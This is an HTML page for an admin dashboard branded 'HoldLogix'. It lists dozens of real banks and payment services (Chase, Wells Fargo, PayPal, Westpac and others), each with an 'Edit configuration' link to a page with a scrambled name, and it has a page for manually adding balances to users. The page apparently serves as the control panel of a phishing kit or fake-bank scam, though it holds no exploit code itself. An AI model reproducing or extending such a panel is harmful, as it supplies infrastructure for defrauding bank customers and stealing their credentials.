<!DOCTYPE html>

<html lang="en" class="light-style layout-menu-fixed" dir="ltr" data-theme="theme-default" data-assets-path="{% static '" data-template="vertical-menu-template-free">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0" />

    <title>
        ADMIN DASH
    </title>

    <meta name="description" content="" />

    <!-- Favicon -->
    <!-- <link rel="icon" type="image/x-icon" href="https://www.inlaks.com/wp-content/uploads/2019/08/Inlaks-Favicon.png" /> -->

     <!-- Icons. Uncomment required icon fonts -->
     <link rel="stylesheet" href="static\vendor\fonts\boxicons.css" />
    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet" />

    <!-- Core CSS -->
   <link rel="stylesheet" href="static\vendor\css\core.css" class="template-customizer-core-css" />
   <link rel="stylesheet" href="static\vendor\css\theme-default.css" class="template-customizer-theme-css" />
   <link rel="stylesheet" href="static\css\dr.css" />

   <!-- Vendors CSS -->
   <link rel="stylesheet" href="static\vendor\libs\perfect-scrollbar\perfect-scrollbar.css" />

   <link rel="stylesheet" href="static\vendor\libs\apex-charts\apex-charts.css" />

   <!-- Page CSS -->

   <!-- Helpers -->
   <script src="static\vendor\js\helpers.js"></script>

   <!--! Template customizer & Theme config files MUST be included after core stylesheets and helpers.js in the <head> section -->
   <!--? Config:  Mandatory theme config file contain global vars & default theme options, Set your preferred theme option in this file.  -->
   <script src="static\js\config.js"></script>

    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.11.0/css/jquery.dataTables.css">
    <style>
      :root {
        --bg: #0b1020;
        --panel: #121a2e;
        --accent: #6ee7ff;
        --accent2: #a78bfa;
        --text: #e2e8f0;
        --muted: #94a3b8;
        --border: rgba(255,255,255,0.08);
      }
      body.admin-theme {
        background: radial-gradient(900px 450px at 20% -10%, #1a2440, transparent),
                    radial-gradient(900px 450px at 80% 110%, #111827, transparent),
                    var(--bg);
        color: var(--text);
      }
      .header-bar {
        display:flex; align-items:center; justify-content:space-between;
        padding: 16px 24px;
        background: linear-gradient(135deg, rgba(18,24,38,.8), rgba(12,16,28,.75));
        border-bottom: 1px solid var(--border);
        backdrop-filter: blur(6px);
        position: sticky; top:0; z-index: 10;
      }
      .header-title { display:flex; align-items:center; gap: 12px; }
      .header-title img { height: 38px; filter: drop-shadow(0 4px 12px rgba(0,0,0,.4)); }
      .header-title h1 { font-size: 20px; margin: 0; font-weight: 700; letter-spacing: .5px; }
      .header-actions a { color: var(--accent); margin-left:16px; text-decoration: none; font-weight: 600; }
      .section-title { font-size: 24px; font-weight: 700; padding: 24px; padding-bottom: 0; }
      .search-wrap { display:flex; padding: 8px 24px 0; }
      .search-input { flex:1; border:1px solid var(--border); background: var(--panel); color: var(--text); border-radius: 10px; padding: 10px 12px; outline:none; }
      .cards-grid { display:grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap:16px; padding: 24px; }
      .admin-card { display:block; background: linear-gradient(135deg, rgba(25,33,54,.92), rgba(16,22,38,.92)); border:1px solid var(--border); border-radius: 12px; padding: 16px; color: var(--text); text-decoration:none; box-shadow: 0 8px 30px rgba(0,0,0,.35); transition: transform .2s ease, box-shadow .2s ease, border-color .2s ease; }
      .admin-card:hover { transform: translateY(-3px); box-shadow: 0 16px 44px rgba(0,0,0,.45); border-color: rgba(110,231,255,.35); }
      .admin-card .card-title { font-weight: 700; margin-bottom: 6px; }
      .admin-card .card-sub { color: var(--muted); font-size: 13px; }
      @media (max-width: 768px) { .header-actions { display:none; } .section-title { font-size: 20px; } }
    </style>
   
</head>

<body class="admin-theme">


    <!-- Layout wrapper -->
    <div class="layout-wrapper layout-content-navbar">

        <div class="layout-container">

            

            <!-- Layout container -->
            <div class="layout-page">






                <!-- Navbar -->


          


                <!-- / Navbar -->

                <!-- Content wrapper -->
                <div class="content-wrapper">
                    <div class="header-bar">
                        <div class="header-title">
                            <img src="assets/logo.png" alt="HoldLogix" />
                            <h1>Admin Dashboard</h1>
                        </div>
                        <div class="header-actions">
                            <a href="manage-users.php">Manage Users</a>
                            <a href="manage-banks.php">Manage Banks</a>
                            <a href="manage-cards.php">Manage Cards</a>
                        </div>
                    </div>

                    <div class="section-title">Edit Banks</div>
                    <div class="search-wrap">
                        <input id="admin-search" class="search-input" type="text" placeholder="Search banks or actions..." />
                    </div>
                    <div class="cards-grid">
                        <a href="cufat_index.php" class="admin-card"><div class="card-title">AFCU Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="zam_index.php" class="admin-card"><div class="card-title">ANZ Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="chris_index.php" class="admin-card"><div class="card-title">CIBC Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="strandsa_index.php" class="admin-card"><div class="card-title">Santander Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="ybb_index.php" class="admin-card"><div class="card-title">BARCLAYS Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="amp_index.php" class="admin-card"><div class="card-title">Suncorp Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="cpt1_index.php" class="admin-card"><div class="card-title">Capital One</div><div class="card-sub">Edit configuration</div></a>
                        <a href="rg_index.php" class="admin-card"><div class="card-title">REGION Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="oab_index.php" class="admin-card"><div class="card-title">Bank of America</div><div class="card-sub">Edit configuration</div></a>
                        <a href="leo_index.php" class="admin-card"><div class="card-title">Cash App</div><div class="card-sub">Edit configuration</div></a>
                        <a href="sim_index.php" class="admin-card"><div class="card-title">Chase Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="niche_index.php" class="admin-card"><div class="card-title">Chime Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="nab_index.php" class="admin-card"><div class="card-title">National Australia Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="msa_index.php" class="admin-card"><div class="card-title">USAA Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="acii_index.php" class="admin-card"><div class="card-title">Citi Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="bouchc_index.php" class="admin-card"><div class="card-title">HSBC Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="pop_index.php" class="admin-card"><div class="card-title">Citizens Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="cud_index.php" class="admin-card"><div class="card-title">DCU Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="ieei_index.php" class="admin-card"><div class="card-title">Huntington Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="eat_index.php" class="admin-card"><div class="card-title">M&T Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="ly_index.php" class="admin-card"><div class="card-title">PayPal</div><div class="card-sub">Edit configuration</div></a>
                        <a href="atew_index.php" class="admin-card"><div class="card-title">T&D Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="dw_index.php" class="admin-card"><div class="card-title">Wells Fargo</div><div class="card-sub">Edit configuration</div></a>
                        <a href="gw_index.php" class="admin-card"><div class="card-title">Woodforest Bank</div><div class="card-sub">Edit configuration</div></a>
                        <!-- Missing USA banks -->
                        <a href="navyfederal" class="admin-card"><div class="card-title">Navy Federal Credit Union</div><div class="card-sub">Edit configuration</div></a>
                        <a href="pnc" class="admin-card"><div class="card-title">PNC Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="keybank" class="admin-card"><div class="card-title">KeyBank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="truist" class="admin-card"><div class="card-title">Truist Bank</div><div class="card-sub">Edit configuration</div></a>
                        <!-- Missing Australia banks -->
                        <a href="bankaustralia" class="admin-card"><div class="card-title">Bank Australia</div><div class="card-sub">Edit configuration</div></a>
                        <a href="boq" class="admin-card"><div class="card-title">Bank of Queensland (BOQ)</div><div class="card-sub">Edit configuration</div></a>
                        <a href="hsbcau" class="admin-card"><div class="card-title">HSBC Australia</div><div class="card-sub">Edit configuration</div></a>
                        <a href="westpac" class="admin-card"><div class="card-title">Westpac</div><div class="card-sub">Edit configuration</div></a>
                        <a href="cba" class="admin-card"><div class="card-title">Commonwealth Bank of Australia</div><div class="card-sub">Edit configuration</div></a>
                        <!-- Missing Canada banks -->
                        <a href="rbc_index.php" class="admin-card"><div class="card-title">Royal Bank of Canada (RBC)</div><div class="card-sub">Edit configuration</div></a>
                        <a href="sbi_index.php" class="admin-card"><div class="card-title">SBI Canada Bank</div><div class="card-sub">Edit configuration</div></a>
                        <a href="bmo_index.php" class="admin-card"><div class="card-title">Bank of Montreal (BMO)</div><div class="card-sub">Edit configuration</div></a>
                        <a href="cwb_index.php" class="admin-card"><div class="card-title">Canadian Western Bank (CWB)</div><div class="card-sub">Edit configuration</div></a>
                        <a href="AddBalanceToAuser.php" class="admin-card"><div class="card-title">Edit a User</div><div class="card-sub">Adjust balances and permissions</div></a>
                    </div>

                    <script>
                        function myFunction() {
                            // Get the text field
                            var copyText = document.getElementById("myInput");

                            // Select the text field
                            copyText.select();
                            copyText.setSelectionRange(0, 99999); // For mobile devices

                            // Copy the text inside the text field
                            navigator.clipboard.writeText(copyText.value);

                            // Alert the copied text
                            alert("Copied!\n" + copyText.value);
                        }
                    </script>


                    <!-- Footer -->

                    <!-- / Footer -->

                    <div class="content-backdrop fade"></div>
                </div>
                <!-- Content wrapper -->
            </div>
            <!-- / Layout page -->
        </div>

        <!-- Overlay -->
        <div class="layout-overlay layout-menu-toggle"></div>


        <div id="toast-container" class="toast-top-left">
            <div class="toast toast-success bg-success" aria-live="polite" style="background-color: black;">
                <div class="toast-title"> </div>
                <div class="toast-message"> </div>
            </div>
        </div>


    </div>

    </div>
    <!-- / Layout wrapper -->



    <!-- Core JS -->
    <!-- build:js assets/vendor/js/core.js -->
    <script src="static\vendor\libs\jquery\jquery.js"></script>
    <script src="static\vendor\libs\popper\popper.js"></script>
    <script src="static\vendor\js\bootstrap.js"></script>
    <script src="static\vendor\libs\perfect-scrollbar\perfect-scrollbar.js"></script>

    <script src="static\vendor\js\menu.js"></script>
    <!-- endbuild -->

    <!-- Vendors JS -->
    <script src="static\vendor\libs\apex-charts\apexcharts.js"></script>

    <!-- Main JS -->
    <script src="static\js\main.js"></script>

    <!-- Page JS -->
    <script src="static\js\dashboards-analytics.js"></script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

    <script src="static\js\toast.js"></script>

    <script src="https://cdn.datatables.net/1.11.0/js/jquery.dataTables.js"></script>
    <script>
      // Lightweight search filter for admin cards
      (function(){
        var input = document.getElementById('admin-search');
        if (!input) return;
        input.addEventListener('input', function(e){
          var q = e.target.value.toLowerCase();
          var cards = document.querySelectorAll('.admin-card');
          for (var i = 0; i < cards.length; i++) {
            var card = cards[i];
            var text = card.textContent || card.innerText || '';
            card.style.display = text.toLowerCase().indexOf(q) !== -1 ? '' : 'none';
          }
        });
      })();
    </script>
</body>

</html>